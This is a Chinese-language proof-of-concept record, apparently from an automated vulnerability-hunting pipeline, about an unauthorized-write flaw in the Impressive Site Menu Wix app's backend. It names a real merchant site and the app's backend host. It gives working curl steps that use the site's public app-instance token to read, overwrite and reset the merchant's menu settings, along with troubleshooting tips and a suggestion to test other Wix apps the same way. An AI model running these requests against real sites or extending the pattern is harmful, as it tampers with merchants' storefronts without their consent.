# Impressive Site Menu 后端 /settings 仅凭站点公开 Wix app-instance 令牌即可创建/修改/删除商户菜单配置

- **code**: impressive-site-menu-settings-unauth-write-wix-instance-toke
- **kind**: poc
- **category**: unauthorized
- **component**: Impressive Site Menu（Wix 第三方应用，后端 site-menu.light-tech.online）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#10 / finding_id=139（finding_checks.verdict=verified，status=confirmed），2026-11-11 17:3x-17:5x UTC，curl 直连：① 匿名 GET https://www.kennysbuyselltrade.co.uk/_api/v1/access-tokens → 200，apps["14206e6f-4e6d-eecd-f424-86531c98386c"].instance=<签名令牌>；② GET https://site-menu.light-tech.online/settings?compId=145134d5-e592-3311-21c4-178d519ba2b9&instance=<令牌>&country=US → 200 {"settings":null,"compId":"...","instanceId":"b2ae1f3a-a0db-4402-b90b-5c7204cc720f","premium":true,...}；③ POST 同 URL {"settings":{"renderType":"slideOut"}} → 200 返回 Mongo 文档 {"_id":"6af4a98b5e5e080c43fe514c","settings":{"renderType":"slideOut"},...}；④ 回读 GET → settings={"renderType":"slideOut"}（持久化，非一次性回显）；⑤ POST {"settings":null} → 200 "OK"，回读 null（已还原）；⑥ 阴性对照：无 instance → 500 未写入；instance 末位翻转 → 200 {"status":403,"error":"Not a verified user"} 未写入。判定成立：任何匿名访客用站点公开令牌即可控制该应用实例配置层（创建/修改/删除）。
- **path**: pocs/impressive-site-menu-settings-unauth-write-wix-instance-toke/impressive_site_menu_settings_unauth_write.md
- **tags**: wix, third-party-app, unauthorized-write, instance-token, site-menu, mongodb, access-tokens
- **created_at**: 2026-11-11T17:52:42.525Z
- **engine**: https://site-menu.light-tech.online（Wix 站点 kennysbuyselltrade.co.uk 的应用实例）

## 描述

第三方 Wix 应用 Impressive Site Menu 的后端 POST /settings 仅校验 Wix app-instance 签名令牌，而该令牌任何匿名访客都能从目标站 /_api/v1/access-tokens 取得。实测以本站公开令牌对该应用实例配置执行「创建 → 回读确认持久化 → 删除还原」全链路成功（renderType: icon→slideOut→null），非预期取得该应用实例配置层的部分控制权；无令牌 500、篡改令牌 403，证明鉴权唯一依据就是公开令牌签名。同类 Wix 第三方 app 后端均应按此模式排查。

## 用法

```
1) 从目标站首页 HTML 提 compId（app widget 配置里的 UUID），并匿名取令牌：curl -s https://<storefront>/_api/v1/access-tokens | jq -r '.apps["<appDefId>"].instance'（Impressive Site Menu 的 appDefId=14206e6f-4e6d-eecd-f424-86531c98386c）。
2) GET https://site-menu.light-tech.online/settings?compId=<compId>&instance=<token>&country=US → 200 且 settings 为当前值即令牌被接受。
3) POST 同 URL Content-Type: application/json，body {"settings":{"renderType":"slideOut"}} → 200 返回带 _id 的 Mongo 文档；再 GET 回读确认持久化。
4) 收尾还原：POST {"settings":null} → 200 "OK"，回读 settings:null。
5) 阴性对照（防误报）：去掉 instance → 500；令牌末位翻转 → 200 {"status":403,"error":"Not a verified user"}。
6) 失败常见原因：compId 抓错（多 widget 同名）、用了别的 app 的 instance、后端 base URL/路径变更（从目标站 widget 网络请求或前端 bundle 重新提取）。
```

## 正文

```
# Impressive Site Menu 后端 /settings 未授权写：公开 Wix app-instance 令牌即可控制商户菜单配置

## 前置条件
- 目标 Wix 站点安装了 Impressive Site Menu（appDefId `14206e6f-4e6d-eecd-f424-86531c98386c`）并渲染了该 widget。
- `compId`：从首页 HTML 的 app widget 配置提取（UUID）。
- `instance`：站点公开接口即可取，任何匿名访客都能拿到：
```bash
curl -s -A "$UA" "https://<storefront>/_api/v1/access-tokens" \
  | jq -r '.apps["14206e6f-4e6d-eecd-f424-86531c98386c"].instance'
```

## 1) 读当前配置（确认令牌被接受）
```bash
curl -sk -A "$UA" \
  "https://site-menu.light-tech.online/settings?compId=<compId>&instance=<instance>&country=US"
```
期望：HTTP 200
```json
{"settings":null或{...},"compId":"<compId>","instanceId":"<instanceId>","premium":true,"userInTrialMode":false}
```

## 2) 写入（创建/修改）
```bash
curl -sk -A "$UA" -X POST \
  "https://site-menu.light-tech.online/settings?compId=<compId>&instance=<instance>&country=US" \
  -H 'Content-Type: application/json' \
  --data '{"settings":{"renderType":"slideOut"}}'
```
期望：HTTP 200，返回 Mongo 文档：
```json
{"_id":"<objectid>","settings":{"renderType":"slideOut"},"compId":"<compId>","instanceId":"<instanceId>","__v":0}
```

## 3) 回读确认持久化（不是一次性回显）
重复步骤 1 → `settings` 已变为写入值。

## 4) 还原（验证闭环）
```bash
curl -sk -A "$UA" -X POST \
  "https://site-menu.light-tech.online/settings?compId=<compId>&instance=<instance>&country=US" \
  -H 'Content-Type: application/json' --data '{"settings":null}'
# → 200 "OK"；回读 settings:null
```

## 判据与阴性对照
- 无 `instance` 参数 → HTTP 500 Internal Server Error（未写入）；
- `instance` 末位篡改 → HTTP 200 + `{"status":403,"error":"Not a verified user"}`（未写入）；
- 只有本站公开令牌签名通过且写入生效 → 非预期取得该应用实例配置层控制权。

## 影响
- 可创建/修改/清空商户菜单配置（布局渲染类型等），影响前台展示；无服务器命令执行。
- 模式可推广：Wix 第三方 app 后端若只校验 app-instance 签名、而令牌在站点 `/_api/v1/access-tokens` 公开，即等同匿名可写，按此模式逐个排查。

## 失败常见原因
- `compId` 抓错（多 widget / 多个 app 同名）→ instanceId 不匹配；
- 令牌属于别的 app（apps 字典 UUID 对不上）→ 403 verified user；
- 后端域名/路径变更 → 从目标站 widget 的网络请求或前端 bundle 重新提取 base URL；
- 写入后前台未刷新 → 应用侧有缓存，以 GET 回读为准。
```
